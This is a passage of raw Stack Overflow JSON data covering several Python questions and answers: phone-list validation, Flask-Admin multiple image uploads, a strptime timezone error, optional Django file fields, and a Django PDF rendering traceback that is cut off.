"last_activity_date": 1463227397, "last_edit_date": 1463227397, "creation_date": 1462997244, "answer_id": 37172331, "question_id": 37171980, "link": "https://stackoverflow.com/questions/37171980/find-out-a-way-to-forbid-user-from-posting-a-array-without-separated/37172331#37172331", "title": "Find out a way to forbid user from posting a array without separated (,)", "body": "<p>How about</p>\n\n<pre><code>if (1 &lt;= len(phones) &lt;= 100 and\n        all(phone.isdigit() and len(phone) == 8 for phone in phones)):\n</code></pre>\n"}], "owner": {"reputation": 2585, "user_id": 3061689, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/kUP4K.jpg?s=128&g=1", "display_name": "Eddwin Paz", "link": "https://stackoverflow.com/users/3061689/eddwin-paz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1471443818, "creation_date": 1462995991, "last_edit_date": 1463052596, "question_id": 37171980, "link": "https://stackoverflow.com/questions/37171980/find-out-a-way-to-forbid-user-from-posting-a-array-without-separated", "title": "Find out a way to forbid user from posting a array without separated (,)", "body": "<p>I want to forbid values of <code>phones</code> such as this:</p>\n\n<h1>NOT ALLOWED EXAMPLE 1</h1>\n\n<pre><code>phones = \"00000000;00000000;00000000;\"\n</code></pre>\n\n<h1>NOT ALLOWED EXAMPLE 2</h1>\n\n<pre><code>phones = \"00000000.00000000.00000000.\"\n</code></pre>\n\n<h1>NOT ALLOWED EXAMPLE 3</h1>\n\n<pre><code>phones = \"000000,,,,00\"\n</code></pre>\n\n<p>and so on </p>\n\n<h1>ONLY ALLOW</h1>\n\n<pre><code>phones = \"00000000,00000000,00000000,00000000,00000000\"\n</code></pre>\n\n<p>Here's my attempt in code:</p>\n\n<pre><code>phones = \"00000000,00000000,00000000,00000000,00000000\"\nphones = phones.split(',')\nif len(phones) &lt;= 100 and len(phones) &gt;= 1:\n    for item in phones:\n        queue_sms(item, body, application_key, account_auth_token, ip_address):\nelse:\n   print \"Phone list is empty or exceeds limit\"\n</code></pre>\n"}, {"tags": ["python", "python-2.7", "python-3.x", "ipython"], "answers": [{"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 2, "last_activity_date": 1462996005, "creation_date": 1462996005, "answer_id": 37171986, "question_id": 37171890, "link": "https://stackoverflow.com/questions/37171890/print-all-in-once/37171986#37171986", "title": "Print all in once", "body": "<p>Here's the general technique:</p>\n\n<pre><code>lines = []\nfor ...\n    lines.append(&lt;whatever you were going to print&gt;)\nprint '\\n'.join(lines)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1031, "user_id": 6229429, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f9d6f8e127ab5e28cf21206e01dc1b81?s=128&d=identicon&r=PG&f=1", "display_name": "Annapoornima Koppad", "link": "https://stackoverflow.com/users/6229429/annapoornima-koppad"}, "is_accepted": true, "score": 0, "last_activity_date": 1462996165, "creation_date": 1462996165, "answer_id": 37172034, "question_id": 37171890, "link": "https://stackoverflow.com/questions/37171890/print-all-in-once/37172034#37172034", "title": "Print all in once", "body": "<p>There is one thing that I would do. I would initialize an empty dictionary or empty list and then append all the items to the empty dictionary or empty list. Finally print the output all together at once. </p>\n\n<pre><code>def filters():\n    mypatterns=[]\n    for LogLine in Log:\n        flag = True\n        for key,ConfLine in Conf.items():\n            for patterns in ConfLine:\n                print patterns\n                mypatterns.append(patterns)\n                if re.match((DateString + patterns), LogLine):\n                    flag = False\n                    break\n            if(flag == False):\n                break\n        if(flag):\n            print LogLine\n\nprint mypatterns\n</code></pre>\n"}], "owner": {"reputation": 5, "user_id": 4164169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/186378fd56e3a0791d2aff249ec9808b?s=128&d=identicon&r=PG&f=1", "display_name": "Pukhraj Singh", "link": "https://stackoverflow.com/users/4164169/pukhraj-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 37172034, "answer_count": 2, "score": 0, "last_activity_date": 1462999664, "creation_date": 1462995642, "last_edit_date": 1462999664, "question_id": 37171890, "link": "https://stackoverflow.com/questions/37171890/print-all-in-once", "title": "Print all in once", "body": "<p>The code that I provided below prints the output one line at a time. However, I want to rewrite the code to print all the content all together at once.</p>\n\n<pre><code>def filters():\n            for LogLine in Log:\n                flag = True\n                for key,ConfLine in Conf.items():\n                    for patterns in ConfLine:\n                        print patterns\n                        if re.match((DateString + patterns), LogLine):\n                            flag = False\n                            break \n\n                    if(flag == False):\n                        break \n\n                if(flag):\n\n                print LogLine\n</code></pre>\n\n<p>Thanks</p>\n"}, {"tags": ["python", "flask", "flask-admin"], "comments": [{"owner": {"reputation": 1622, "user_id": 9789097, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19613b45b3b535c6d829c9d711e5b5e6?s=128&d=identicon&r=PG&f=1", "display_name": "Trect", "link": "https://stackoverflow.com/users/9789097/trect"}, "edited": false, "score": 0, "creation_date": 1541522001, "post_id": 37171860, "comment_id": 93242088, "body": "Reference Page not found. Always avoid giving reference of code in the question"}], "answers": [{"tags": [], "owner": {"reputation": 5091, "user_id": 2714012, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/fRcBY.jpg?s=128&g=1", "display_name": "stamaimer", "link": "https://stackoverflow.com/users/2714012/stamaimer"}, "is_accepted": false, "score": 5, "last_activity_date": 1490011494, "last_edit_date": 1490011494, "creation_date": 1490010453, "answer_id": 42902792, "question_id": 37171860, "link": "https://stackoverflow.com/questions/37171860/upload-multiple-images-with-flask-admin/42902792#42902792", "title": "Upload multiple images with Flask-Admin", "body": "<p>You should custom <code>ImageUploadInput</code> and <code>ImageUploadField</code> as follows.</p>\n\n<pre><code>import ast\nfrom PIL import Image\nfrom wtforms.widgets import html_params, HTMLString\nfrom wtforms.utils import unset_value\nfrom flask_admin.helpers import get_url\nfrom flask_admin.form.upload import ImageUploadField\nfrom flask_admin._compat import string_types, urljoin\n\nclass MultipleImageUploadInput(object):\n    empty_template = \"&lt;input %(file)s multiple&gt;\"\n\n    # display multiple images in edit view of flask-admin\n    data_template = (\"&lt;div class='image-thumbnail'&gt;\"\n                     \"   %(images)s\"\n                     \"&lt;/div&gt;\"\n                     \"&lt;input %(file)s multiple&gt;\")\n\n    def __call__(self, field, **kwargs):\n\n        kwargs.setdefault(\"id\", field.id)\n        kwargs.setdefault(\"name\", field.name)\n\n        args = {\n            \"file\": html_params(type=\"file\", **kwargs),\n        }\n\n        if field.data and isinstance(field.data, string_types):\n\n            attributes = self.get_attributes(field)\n\n            args[\"images\"] = \"&amp;emsp;\".join([\"&lt;img src='{}' /&gt;&lt;input type='checkbox' name='{}-delete'&gt;Delete&lt;/input&gt;\"\n                                            .format(src, filename) for src, filename in attributes])\n\n            template = self.data_template\n\n        else:\n            template = self.empty_template\n\n        return HTMLString(template % args)\n\n    def get_attributes(self, field):\n\n        for item in ast.literal_eval(field.data):\n\n            filename = item\n\n            if field.thumbnail_size:\n                filename = field.thumbnail_size(filename)\n\n            if field.url_relative_path:\n                filename = urljoin(field.url_relative_path, filename)\n\n            yield get_url(field.endpoint, filename=filename), item\n\nclass MultipleImageUploadField(ImageUploadField):\n\n    widget = MultipleImageUploadInput()\n\n    def process(self, formdata, data=unset_value):\n\n        self.formdata = formdata  # get the formdata to delete images\n        return super(MultipleImageUploadField, self).process(formdata, data)\n\n    def process_formdata(self, valuelist):\n\n        self.data = list()\n\n        for value in valuelist:\n            if self._is_uploaded_file(value):\n                self.data.append(value)\n\n    def populate_obj(self, obj, name):\n\n        field = getattr(obj, name, None)\n\n        if field:\n\n            filenames = ast.literal_eval(field)\n\n            for filename in filenames[:]:\n                if filename + \"-delete\" in self.formdata:\n                    self._delete_file(filename)\n                    filenames.remove(filename)\n        else:\n            filenames = list()\n\n        for data in self.data:\n            if self._is_uploaded_file(data):\n\n                self.image = Image.open(data)\n\n                filename = self.generate_name(obj, data)\n                filename = self._save_file(data, filename)\n\n                data.filename = filename\n\n                filenames.append(filename)\n\n        setattr(obj, name, str(filenames))\n</code></pre>\n\n<p>After that, You can use them as image upload example in flask-admin</p>\n\n<pre><code>class ModelHasMultipleImages(db.Model):\n\n    id = db.Column(db.Integer(), primary_key=1)\n\n    # len of str representation of filename lists may exceed the len of field\n\n    image = db.Column(db.String(128))  \n\nclass ModelViewHasMultipleImages(ModelView):\n\n    def _list_thumbnail(view, context, model, name):\n\n        if not model.image:\n            return ''\n\n        def gen_img(filename):\n            return '&lt;img src=\"{}\"&gt;'.format(url_for('static', \n                   filename=\"images/custom/\" + form.thumbgen_filename(image)))\n\n        return Markup(\"&lt;br /&gt;\".join([gen_img(image) for image in ast.literal_eval(model.image)]))\n\n    column_formatters = {'image': _list_thumbnail}\n\n    form_extra_fields = {'image': MultipleImageUploadField(\"Images\",\n                                  base_path=\"app/static/images/custom\",\n                                  url_relative_path=\"images/custom/\",\n                                  thumbnail_size=(400, 300, 1))}\n</code></pre>\n\n<p>The image filed of <code>ModelHasMultipleImages</code> store the str represent of filename list.</p>\n"}, {"tags": [], "owner": {"reputation": 1622, "user_id": 9789097, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19613b45b3b535c6d829c9d711e5b5e6?s=128&d=identicon&r=PG&f=1", "display_name": "Trect", "link": "https://stackoverflow.com/users/9789097/trect"}, "is_accepted": false, "score": 1, "last_activity_date": 1541522327, "creation_date": 1541522327, "answer_id": 53176193, "question_id": 37171860, "link": "https://stackoverflow.com/questions/37171860/upload-multiple-images-with-flask-admin/53176193#53176193", "title": "Upload multiple images with Flask-Admin", "body": "<p>Dropzone is the best way to do this</p>\n\n<p>Download with </p>\n\n<pre><code>pip install flask flask-uploads flask-dropzone\n</code></pre>\n\n<p>The Python app.py should look somthhing like this</p>\n\n<pre><code># app.py\n\nfrom flask import Flask, render_template\nfrom flask_dropzone import Dropzone\nfrom flask_uploads import UploadSet, configure_uploads, IMAGES, patch_request_class\n\nimport os\n\napp = Flask(__name__)\ndropzone = Dropzone(app)\n\n# Dropzone settings\napp.config['DROPZONE_UPLOAD_MULTIPLE'] = True\napp.config['DROPZONE_ALLOWED_FILE_CUSTOM'] = True\napp.config['DROPZONE_ALLOWED_FILE_TYPE'] = 'image/*'\napp.config['DROPZONE_REDIRECT_VIEW'] = 'results'\n\n# Uploads settings\napp.config['UPLOADED_PHOTOS_DEST'] = os.getcwd() + '/uploads'\n\nphotos = UploadSet('photos', IMAGES)\nconfigure_uploads(app, photos)\npatch_request_class(app)  # set maximum file size, default is 16MB\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/results')\ndef results():\n    return render_template('results.html')\n</code></pre>\n\n<p>And result.html looks as follows</p>\n\n<pre><code># templates/results.html\n\n&lt;h1&gt;Hello Results Page!&lt;/h1&gt;\n&lt;a href=\"{{ url_for('index') }}\"&gt;Back&lt;/a&gt;&lt;p&gt;\n\n&lt;ul&gt;\n{% for file_url in file_urls %}\n    &lt;li&gt;&lt;img style=\"height: 150px\" src=\"{{ file_url }}\"&gt;&lt;/li&gt;\n{% endfor %}\n&lt;/ul&gt;\n</code></pre>\n\n<p>index.html looks something like this</p>\n\n<pre><code># templates/index.html\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;Flask App&lt;/title&gt;\n        {{ dropzone.load() }}\n        {{ dropzone.style('border: 2px dashed #0087F7; margin: 10%; min-height: 400px;') }}\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;h1&gt;Hello from Flask!&lt;/h1&gt;\n        {{ dropzone.create(action_view='index') }}\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"}], "owner": {"reputation": 91, "user_id": 2662215, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/53bfb6d206e0f3b3c8beb143172f377c?s=128&d=identicon&r=PG", "display_name": "mrzoogle", "link": "https://stackoverflow.com/users/2662215/mrzoogle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2053, "favorite_count": 3, "answer_count": 2, "score": 2, "last_activity_date": 1541523227, "creation_date": 1462995487, "last_edit_date": 1541523227, "question_id": 37171860, "link": "https://stackoverflow.com/questions/37171860/upload-multiple-images-with-flask-admin", "title": "Upload multiple images with Flask-Admin", "body": "<p>I am trying to get the fileadmin to get multiple files uploaded but can't figure out how to do that.</p>\n\n<p>Currently in the below reference I can only upload one file at a time.</p>\n\n<p><a href=\"https://github.com/flask-admin/flask-admin/blob/master/examples/file/app.py\" rel=\"nofollow noreferrer\">https://github.com/flask-admin/flask-admin/blob/master/examples/file/app.py</a>\n<br><em>(New Link to to file: <a href=\"https://github.com/mrjoes/flask-admin/blob/master/examples/file/app.py\" rel=\"nofollow noreferrer\">https://github.com/mrjoes/flask-admin/blob/master/examples/file/app.py</a> )</em></p>\n\n<p>I tried updating the html template to have <code>multiple=\"\"</code> but that didn't helped to upload multiple files.</p>\n\n<hr>\n\n<p>Further looking into this I think this html file needs to have <code>multiple=\"\"</code></p>\n\n<blockquote>\n  <p>Python27\\Lib\\site-packages\\flask_admin\\templates\\bootstrap3\\adminC:\\Python27\\Lib\\site-packages\\flask_admin\\templates\\bootstrap3\\admin\\lib.html</p>\n</blockquote>\n\n<p>Although I am not sure where/how to add this tag without actually overwriting the source file.</p>\n"}, {"tags": ["python", "python-3.x", "datetime", "python-datetime"], "comments": [{"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "edited": false, "score": 2, "creation_date": 1462995710, "post_id": 37171815, "comment_id": 61878449, "body": "maybe you should try dateutil.parser.parse, it can prevent such struggle <a href=\"http://dateutil.readthedocs.io/en/stable/parser.html\" rel=\"nofollow noreferrer\">dateutil.readthedocs.io/en/stable/parser.html</a>"}, {"owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 2, "creation_date": 1462996132, "post_id": 37171815, "comment_id": 61878682, "body": "if you use <code>date_rta = &quot;Wed Mar 09 21:59:50 UTC 2016&quot;</code>(change PST with UTC) it works, so it must be related to the timezone value. see <a href=\"http://bugs.python.org/issue22377\" rel=\"nofollow noreferrer\">issue</a>"}, {"owner": {"reputation": 3466, "user_id": 369710, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/e7b58abe2b8d8faa4b380d48bf85979d?s=128&d=identicon&r=PG", "display_name": "Everaldo Aguiar", "link": "https://stackoverflow.com/users/369710/everaldo-aguiar"}, "reply_to_user": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "edited": false, "score": 0, "creation_date": 1462997000, "post_id": 37171815, "comment_id": 61879181, "body": "These were all really helpful! @Apero I re-wrote the code using that and it works now! would that be a lot less efficient though?"}, {"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "edited": false, "score": 1, "creation_date": 1462997082, "post_id": 37171815, "comment_id": 61879229, "body": "No idea regarding efficiency, but it is a really famous and widely used third-party module"}], "answers": [{"tags": [], "owner": {"reputation": 3466, "user_id": 369710, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/e7b58abe2b8d8faa4b380d48bf85979d?s=128&d=identicon&r=PG", "display_name": "Everaldo Aguiar", "link": "https://stackoverflow.com/users/369710/everaldo-aguiar"}, "is_accepted": false, "score": 0, "last_activity_date": 1462997126, "creation_date": 1462997126, "answer_id": 37172301, "question_id": 37171815, "link": "https://stackoverflow.com/questions/37171815/time-data-format-mismatch-error/37172301#37172301", "title": "Time data format mismatch error", "body": "<p>As pointed out by M.T, there appears to be an issue with strptime() and timezones. Re-writing my code as follows achieved the result I was expecting:</p>\n\n<pre><code>from dateutil.parser import parse    \n...\nd1 = parse(date_ds)\nd2 = parse(date_rta)\n...\n</code></pre>\n"}], "owner": {"reputation": 3466, "user_id": 369710, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/e7b58abe2b8d8faa4b380d48bf85979d?s=128&d=identicon&r=PG", "display_name": "Everaldo Aguiar", "link": "https://stackoverflow.com/users/369710/everaldo-aguiar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 294, "favorite_count": 0, "closed_date": 1462997211, "answer_count": 1, "score": 0, "last_activity_date": 1462997126, "creation_date": 1462995320, "question_id": 37171815, "link": "https://stackoverflow.com/questions/37171815/time-data-format-mismatch-error", "closed_reason": "Duplicate", "title": "Time data format mismatch error", "body": "<p>I have a piece of code that currently runs without any issues on my local python (anaconda python 3.5.1) but is giving me an odd error when I run it in production (where I am under the impression the environment is very similar and the python version is the same).</p>\n\n<p>Below is the relevant code snippet:</p>\n\n<pre><code>ds_date_format = \"%Y%m%d\"\nrta_date_format = '%a %b %d %H:%M:%S %Z %Y'\n\nd1 = datetime.datetime.strptime(date_ds, ds_date_format)\nd2 = datetime.datetime.strptime(date_rta, rta_date_format).replace(hour=0, minute=0, second=0)\n</code></pre>\n\n<p>And the traceback for the error I am getting. </p>\n\n<pre><code>{\n  \"error\": {\n    \"traceback\": [\n      \"Traceback (most recent call last):\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/site-packages/tornado/web.py\\\", line 1445, in _execute\\n    result = yield result\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/site-packages/tornado/gen.py\\\", line 1008, in run\\n    value = future.result()\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/site-packages/tornado/concurrent.py\\\", line 232, in result\\n    raise_exc_info(self._exc_info)\\n\",\n      \"  File \\\"&lt;string&gt;\\\", line 3, in raise_exc_info\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/site-packages/tornado/gen.py\\\", line 1017, in run\\n    yielded = self.gen.send(value)\\n\",\n      \"  File \\\"&lt;string&gt;\\\", line 6, in _wrap_awaitable\\n\",\n      \"  File \\\"rtamatching.py\\\", line 171, in post\\n    self.write(await self.rta_matcher.check_matches(data))\\n\",\n      \"  File \\\"rtamatching.py\\\", line 114, in check_matches\\n    date_match_scores.append(date_similarity(date, user_feeds[key]['TransactionDate']))\\n\",\n      \"  File \\\"/opt/api/functions.py\\\", line 9, in date_similarity\\n    d2 = datetime.datetime.strptime(date_rta, rta_date_format).replace(hour=0, minute=0, second=0)\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/_strptime.py\\\", line 500, in _strptime_datetime\\n    tt, fraction = _strptime(data_string, format)\\n\",\n      \"  File \\\"/opt/conda/lib/python3.5/_strptime.py\\\", line 337, in _strptime\\n    (data_string, format))\\n\",\n      \"ValueError: time data 'Wed Mar 09 21:59:50 PST 2016' does not match format '%a %b %d %H:%M:%S %Z %Y'\\n\"\n    ],\n    \"code\": 500,\n    \"message\": \"Internal Server Error\"\n  }\n}\n</code></pre>\n\n<p>That value error seems odd to be because as far as I can tell, the format specified is correct.</p>\n"}, {"tags": ["python", "django", "django-views"], "comments": [{"owner": {"reputation": 4111, "user_id": 817766, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/eALxl.png?s=128&g=1", "display_name": "Djizeus", "link": "https://stackoverflow.com/users/817766/djizeus"}, "edited": false, "score": 1, "creation_date": 1462995238, "post_id": 37171746, "comment_id": 61878185, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/5895588/django-multivaluedictkeyerror-error-how-do-i-deal-with-it\">django MultiValueDictKeyError error, how do i deal with it</a>"}], "answers": [{"tags": [], "owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "is_accepted": true, "score": 1, "last_activity_date": 1462998151, "creation_date": 1462998151, "answer_id": 37172593, "question_id": 37171746, "link": "https://stackoverflow.com/questions/37171746/django-file-field-update-causing-error-even-though-not-required/37172593#37172593", "title": "Django file field update causing error even though not required", "body": "<p>The point is that you are ignoring the validation that form does, and going straight back to the data from the request. So, yes, that will break if the forms are not there. But this is exactly why we use forms.</p>\n\n<pre><code>case.upload4 = form.cleaned_data['upload4']\n</code></pre>\n\n<p>etc.</p>\n\n<p>It would be even easier if you used a ModelForm; then you could pass <code>case</code> as the <code>instance</code> argument of the form, and just do <code>form.save()</code>, replacing almost all the code inside your <code>is_valid</code> block.</p>\n"}, {"tags": [], "owner": {"reputation": 1265, "user_id": 1077645, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/22960a4928062a6bc3cbb3bc911134c4?s=128&d=identicon&r=PG", "display_name": "Anoop", "link": "https://stackoverflow.com/users/1077645/anoop"}, "is_accepted": false, "score": 0, "last_activity_date": 1462998484, "creation_date": 1462998484, "answer_id": 37172677, "question_id": 37171746, "link": "https://stackoverflow.com/questions/37171746/django-file-field-update-causing-error-even-though-not-required/37172677#37172677", "title": "Django file field update causing error even though not required", "body": "<p>This will solve the problem.</p>\n\n<pre><code>case.upload4 = request.FILES.get('upload4')\ncase.upload5 = request.FILES.get('upload5')\ncase.upload6 = request.FILES.get('upload6')\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 5853827, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ba8ff589a69b0bdd43059e8b235f1582?s=128&d=identicon&r=PG&f=1", "display_name": "led4966", "link": "https://stackoverflow.com/users/5853827/led4966"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 227, "favorite_count": 0, "accepted_answer_id": 37172593, "answer_count": 2, "score": 1, "last_activity_date": 1462998484, "creation_date": 1462995076, "last_edit_date": 1462995382, "question_id": 37171746, "link": "https://stackoverflow.com/questions/37171746/django-file-field-update-causing-error-even-though-not-required", "title": "Django file field update causing error even though not required", "body": "<p>I have an app that serves to update certain fields of a model. There are 4 possible fields that could be updated: resolution, upload4, upload5, and upload6. The upload fields are NOT required. If I do not include the request.FILES line, the uploaded file will not be saved to the database, but it seems like because I've included it, I need to always upload the 3 files, even though they are not required. The exception I am getting is \"MultiValueDictKeyError\" on the POST. How can I fix this? I want the option to add 3 files, but I don't want to have to every time. I understand how to make a field not required, I don't know how to code the request.FILES to understand that it is not required. </p>\n\n<p>views.py</p>\n\n<pre><code>@login_required(login_url='/login/')\ndef report(request, case_id):\n\n    form = ReportForm()\n    case = get_object_or_404(Incident, pk=case_id)\n\n    # if this is a POST request we need to process the form data            \n    if request.POST:\n\n        # create a form instance and populate it with the data from the request:\n        form = ReportForm(request.POST)\n\n        if form.is_valid():\n            resolution = (form.cleaned_data['resolution'])      # grabbing action_taken from user input\n            case.resolution = resolution\n            case.upload4 = request.FILES['upload4']\n            case.upload5 = request.FILES['upload5']\n            case.upload6 = request.FILES['upload6']\n            case.status = Status.objects.get(status='closed')\n            case.save(update_fields=['resolution', 'status', 'upload4', 'upload5', 'upload6'])\n            context = { 'case': case,\n                        'form': form}\n            return HttpResponseRedirect(reverse('dashboard_app:dashboard'))\n\n    template = \"report.html\"\n    #form = CaseForm()\n    context = { 'case': case,\n                'form': form}   \n\n    return render(request, template, context)\n</code></pre>\n"}, {"tags": ["python", "django", "pdf-generation", "reportlab", "xhtml2pdf"], "comments": [{"owner": {"reputation": 19246, "user_id": 494134, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/3XHKr.png?s=128&g=1", "display_name": "John Gordon", "link": "https://stackoverflow.com/users/494134/john-gordon"}, "edited": false, "score": 0, "creation_date": 1462995886, "post_id": 37171649, "comment_id": 61878542, "body": "Does the traceback say which line of <i>your</i> code is causing the error?"}, {"owner": {"reputation": 19246, "user_id": 494134, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/3XHKr.png?s=128&g=1", "display_name": "John Gordon", "link": "https://stackoverflow.com/users/494134/john-gordon"}, "edited": false, "score": 0, "creation_date": 1462996124, "post_id": 37171649, "comment_id": 61878676, "body": "Also, what does <code>render_to_pdf()</code> return if <code>pdf.err</code> is truthy?  In the post you linked, there&#39;s a catchall <code>return HTTPResponse(...)</code> as the last line of <code>render_to_pdf()</code>, which your code does not have."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 1, "creation_date": 1462997241, "post_id": 37171649, "comment_id": 61879310, "body": "we need the entire traceback, or at least the part that references your code above! otherwise we&#39;re just guessing (e.g. <code>site_pages</code> doesn&#39;t return something that can be passed directly to <code>Context()</code> would be a guess..)"}, {"owner": {"reputation": 127, "user_id": 4496057, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/523475955/picture?type=large", "display_name": "Jayan Karthik Pari", "link": "https://stackoverflow.com/users/4496057/jayan-karthik-pari"}, "edited": false, "score": 0, "creation_date": 1462997590, "post_id": 37171649, "comment_id": 61879471, "body": "pdf.err is false in this case and the execution hits the HTTPResponse() line"}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462997892, "post_id": 37171649, "comment_id": 61879625, "body": "Can you write <code>result.getvalue()</code> to a file (and does it open as valid pdf?)"}, {"owner": {"reputation": 127, "user_id": 4496057, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/523475955/picture?type=large", "display_name": "Jayan Karthik Pari", "link": "https://stackoverflow.com/users/4496057/jayan-karthik-pari"}, "edited": false, "score": 0, "creation_date": 1462998366, "post_id": 37171649, "comment_id": 61879884, "body": "Yes I&#39;m able to do that open the pdf fine"}, {"owner": {"reputation": 127, "user_id": 4496057, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/523475955/picture?type=large", "display_name": "Jayan Karthik Pari", "link": "https://stackoverflow.com/users/4496057/jayan-karthik-pari"}, "edited": false, "score": 0, "creation_date": 1462999263, "post_id": 37171649, "comment_id": 61880394, "body": "Ok I have figured out what the issue is here. On my View I was inheriting TemplateView and removing that fixed it"}], "owner": {"reputation": 127, "user_id": 4496057, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/523475955/picture?type=large", "display_name": "Jayan Karthik Pari", "link": "https://stackoverflow.com/users/4496057/jayan-karthik-pari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 324, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1462997514, "creation_date": 1462994693, "last_edit_date": 1495541766, "question_id": 37171649, "link": "https://stackoverflow.com/questions/37171649/django-valueerror-dictionary-update-sequence-element-0-has-length-5918-2-is", "title": "Django: ValueError: dictionary update sequence element #0 has length 5918; 2 is required", "body": "<p>I use Django 1.8, reportlab and xhtml2pdf, html5lib, pypdf and the view goes like this (<a href=\"https://stackoverflow.com/a/1377652/4496057\">https://stackoverflow.com/a/1377652/4496057</a>)</p>\n\n<pre><code>def render_to_pdf(template_src, context_dict, request):\n    template = get_template(template_src)\n    context = Context(site_pages(request))\n    html = template.render(context)\n    result = StringIO.StringIO()\n\n    pdf = pisa.pisaDocument(StringIO.StringIO(html.encode(\"UTF-8\")), result)\n    if not pdf.err:\n        return HttpResponse(content=result.getvalue(), content_type='application/pdf')\n    return HttpResponse('We had some errors&lt;pre&gt;%s&lt;/pre&gt;' % escape(html))\n</code></pre>\n\n<p>and im getting the following error\nUpdate(Entire traceback):</p>\n\n<pre><code>Internal Server Error: /system/MNE/1212/doctor/summary-pdf/8/123123123\nTraceback (most recent call last):\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/core/handlers/base.py\", line 164, in get_response\n    response = response.render()\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/template/response.py\", line 158, in render\n    self.content = self.rendered_content\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/template/response.py\", line 135, in rendered_content\n    content = template.render(context, self._request)\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/template/backends/django.py\", line 72, in render\n    context = make_context(context, request)\n  File \"/home/vagrant/sat/lib/python2.7/site-packages/django/template/context.py\", line 272, in make_context\n    context.push(original_context)\n  File 